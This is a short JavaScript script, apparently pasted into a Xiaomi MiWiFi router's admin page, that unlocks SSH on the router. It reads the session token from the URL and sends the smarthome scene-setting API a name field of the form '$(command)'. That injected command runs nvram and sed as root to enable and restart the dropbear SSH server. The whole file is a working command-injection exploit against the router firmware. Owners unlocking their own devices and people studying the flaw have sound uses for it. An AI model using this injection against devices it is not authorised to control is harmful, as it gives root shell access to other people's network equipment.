// https://miwifi.dev/ssh

function getSTOK() {
  let match = location.href.match(/;stok=(.*?)\//);
  if (!match) {
    return null;
  }
  return match[1];
}

let timeCount = 0;
async function request_smartcontroller(stok, command) {
  command = encodeURIComponent(command);
  let path = `/cgi-bin/luci/;stok=${stok}/api/xqsmarthome/request_smartcontroller`;
  console.log('request_smartcontroller=> stock:%s command:%s', stok, command);
  window.timeCount = window.timeCount ?? 1;
  const timeCount = window.timeCount;

  await fetch(new Request(location.origin + path, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: encodeURIComponent(`payload={"command":"scene_setting","name":"'$(${command})'","action_list":[{"thirdParty":"xmrouter","delay":17,"type":"wan_block","payload":{"command":"wan_block","mac":"00:00:00:00:00:00"}}],"launch":{"timer":{"time":"3:${timeCount}","repeat":"0","enabled":true}}}`),
  }))
    .then((response) => response.text())
    .then((text) => console.log(text));

  await fetch(new Request(location.origin + path, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: encodeURIComponent(`payload={"command":"scene_start_by_crontab","time":"3:${timeCount}","week":0}`),
  }))
    .then((response) => response.text())
    .then((text) => console.log(text));

  window.timeCount = window.timeCount + 1;
}

async function set_sys_time(stok) {
  let path = `/cgi-bin/luci/;stok=${stok}/api/misystem/set_sys_time?time=2023-2-19%2023:4:47&timezone=CST-8`;
  console.log(path);
  await fetch(new Request(location.origin + path))
    .then((response) => response.text())
    .then((text) => console.log(text));
}

async function enableSSH() {
  stok = getSTOK();
  if (!stok) {
    console.error('stok not found in URL');
    return;
  }
  console.log(`stok=> ${stok}`);

  await set_sys_time(stok);

  await request_smartcontroller(stok, `
nvram set ssh_en=1
&& nvram commit
&& sed -i 's/channel=.*/channel=\\"debug\\"/g' /etc/init.d/dropbear
&& /etc/init.d/dropbear enable
&& /etc/init.d/dropbear restart
`);
}

enableSSH();
